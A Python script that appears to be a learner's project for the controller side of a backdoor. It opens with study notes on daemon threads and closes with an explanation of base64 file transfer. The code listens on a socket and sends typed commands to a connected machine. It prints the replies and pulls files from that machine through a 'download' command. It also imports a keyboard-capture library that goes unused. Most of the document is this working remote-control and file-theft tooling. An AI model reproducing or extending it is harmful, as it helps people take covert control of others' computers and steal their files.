"""
MAIN PROGRAM = CHILD THREAD  +  MAIN THREAD

Child threads = daemon and non-daemon(default)

eg:
  in a proram:
    * 1 main thread is there and 4 extra chreads
    * so these 4 threads are non-daemon threads by default.
  * when the main thread and these 4 daemon threads are not completed, the program execution will remian continue.
    * main thread is also a kind of non-daemon thread
  * We need to create daemon thread separately.
  * when the main thread and all non-daemon threads are finished in the program, the daemon threads will be ended automatically even if the work of daemon thread is still pending.

"""


# imports and dependencies
from pynput import keyboard
import os, sys, socket, threading, subprocess, json, base64, requests, time


def cmd_send(sock_fd, cmd):  # socket file descrypter is a conn. object and cmd is command data
    cmd = json.dumps(cmd)
    cmd = cmd.encode()
    sock_fd.send(cmd)


def cmd_recv(sock_fd):
    data = ''
    while True:
        data = data + sock_fd.recv(1024).decode()
        # recved cmd in bytes --> decoded it --> and converted into json
        try:
            data = json.loads(data)
            return data
        except:
            continue
          # try it:- "hi yash --> json --> completely recved at other end --> loads to convert it back to string"
          # else continue and first do recv the complete data then convert it back into string

def download(sock_fd,filename='file.txt'):
    data = cmd_recv(sock_fd)
    with open(filename,"wb") as file:
        file.write(base64.b64decode(data))


# main function for listening for connection from client and sending data
def main():
    HOST = "127.0.0.1"  # IP address
    PORT = 1234  # Port no. to listen on
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)
    print("[+] Listining...")
    sock_fd, conn_addr = s.accept()
    # thorugh sock_fd -- connection will occur and conn_addr will tell from where the connection is coming
    if (conn_addr):
        print("[+] new connection:", conn_addr)
        while True:
            cmd = input("cmd> ")
            cmd_send(sock_fd, cmd)
            # sock_fd.send(cmd.encode())#dont need this line as we are calling the send function
            if cmd[:8] == 'download':
              download(sock_fd)
              continue
            res = cmd_recv(sock_fd)
            # res = sock_fd.recv(1024) #dont need this line as we are calling the recv function
            print(res)
    sock_fd.close()
    s.close()

main()


""" 
Computer A                                                      Computer B
file.txt    ==> read                      ==> send.encode() ==> Write
image.jpg   ==> base64encode(read binary) ==> send          ==> base64decode(Write binary)

ALGO:
1. Read file in binary mode 
2. encoding file data into base64 because in binary mode the character are not readable effectively
3. encode data into bytes
4. send bytes
5. recv and decode to str
6. decoding base64
7. write bytes into file 

"""